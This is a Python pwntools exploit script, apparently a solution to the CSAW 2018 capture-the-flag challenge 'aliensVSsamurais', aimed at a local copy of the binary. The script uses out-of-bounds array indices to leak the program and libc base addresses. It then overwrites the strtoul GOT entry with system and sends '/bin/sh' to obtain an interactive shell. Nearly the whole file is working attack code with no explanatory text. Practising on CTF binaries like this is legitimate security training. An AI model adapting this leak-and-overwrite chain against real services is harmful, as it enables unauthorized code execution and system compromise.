#!/usr/bin/env python2
# coding: utf-8
# Usage: ./exploit.py MODE=remote LOG_LEVEL=warn NOPTRACE NOASLR

from pwn import *
import itertools

# IP = "pwn.chal.csaw.io"
# PORT = 9004
IP = "127.0.0.1"
PORT = 8000

context.log_level = 'DEBUG'
context.terminal = ['tmux', 'splitw', '-h']
mode = args['MODE'].lower()
binary = "./aliensVSsamurais"


def r(x): return io.recv(x)
def ru(x): return io.recvuntil(x)
def rud(x): return io.recvuntil(x, drop=True)
def se(x): return io.send(x)
def sel(x): return io.sendline(x)
def pick32(x): return u32(x[:4].ljust(4, '\0'))
def pick64(x): return u64(x[:8].ljust(8, '\0'))


if mode == "remote":
    context.noptrace = True
    io = remote(IP, PORT)
    # libc = ELF("./libc.so.6")
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
    binary = ELF("./aliensVSsamurais")
    one_gg = 0x4f322
    padding = 0
else:
    io = process(binary)
    proc_base = io.libs()[
        "/home/vagrant/DongFeng/CSAW18/pwn/alien_invasion/aliensVSsamurais"]
    libc_bb = io.libs()['/lib/x86_64-linux-gnu/libc-2.23.so']
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
    binary = ELF("./aliensVSsamurais")
    one_gg = 0xf02a4
    one_gg = 0x45216
    padding = 0x10


## create two samurai
rud("Daimyo, nani o shitaidesu ka?")
sel("1")
rud("What is my weapon's name?")
sel("A"*7)
rud("Daimyo, nani o shitaidesu ka?")
sel("1")
rud("What is my weapon's name?")
sel("B"*7)
rud("Daimyo, nani o shitaidesu ka?")
sel("1")
rud("What is my weapon's name?")
sel("C"*7)

# break
rud("Daimyo, nani o shitaidesu ka?")
sel("3")

rud("Brood mother, what tasks do we have today.")
sel("1")
rud("How long is my name?")
sel(str(0x60))
rud("What is my name?")
sel("B"*0x5f)


rud("Brood mother, what tasks do we have today.")
sel(str(3))
rud("Brood mother, which one of my babies would you like to rename?")
sel(str(-10))
rud("Oh great what would you like to rename ")

data = rud("\n").strip()[:-4].ljust(8, "\x00")
data = u64(data)
bin_base = data - 0x0202070
binary.address = bin_base

print "leaked bin base: ", hex(bin_base)

io.send("\x70")


rud("Brood mother, what tasks do we have today.")
sel(str(3))
rud("Brood mother, which one of my babies would you like to rename?")
sel(str(400))
rud("Oh great what would you like to rename ")
sel(p64(binary.address + 0x0000000000202700 + 8))

rud("Brood mother, what tasks do we have today.")
sel(str(3))
rud("Brood mother, which one of my babies would you like to rename?")
sel(str(401))
rud("Oh great what would you like to rename ")
sel(p64(binary.got["__libc_start_main"]))

# gdb.attach(io, '''
# aslr off
# b *0x{:x}
# b *0x{:x}
# c
# '''.format(
#     proc_base+0x0000000000000D39,  # call gets
#     proc_base+0x0000000000000DAD,  # call read
#     libc_bb + one_gg
#     )
# )

rud("Brood mother, what tasks do we have today.")
sel(str(3))
rud("Brood mother, which one of my babies would you like to rename?")
sel(str(200))
rud("Oh great what would you like to rename ")
data = rud("\n").strip()[:-4].ljust(8, "\x00")
# print data, data.encode("hex")
data = u64(data)
libc_base = data - libc.symbols["__libc_start_main"]
libc.address = libc_base

print "leaked libc base: ", hex(libc.address)

io.send("\x40")

rud("Brood mother, what tasks do we have today.")
sel(str(3))
rud("Brood mother, which one of my babies would you like to rename?")
sel(str(401))
rud("Oh great what would you like to rename ")
sel(p64(binary.got["strtoul"]))

rud("Brood mother, what tasks do we have today.")
sel(str(3))
rud("Brood mother, which one of my babies would you like to rename?")
sel(str(200))
rud("Oh great what would you like to rename ")
io.send(p64(libc.symbols["system"]))

rud("Brood mother, what tasks do we have today.")
sel("/bin/sh\x00")


io.interactive()

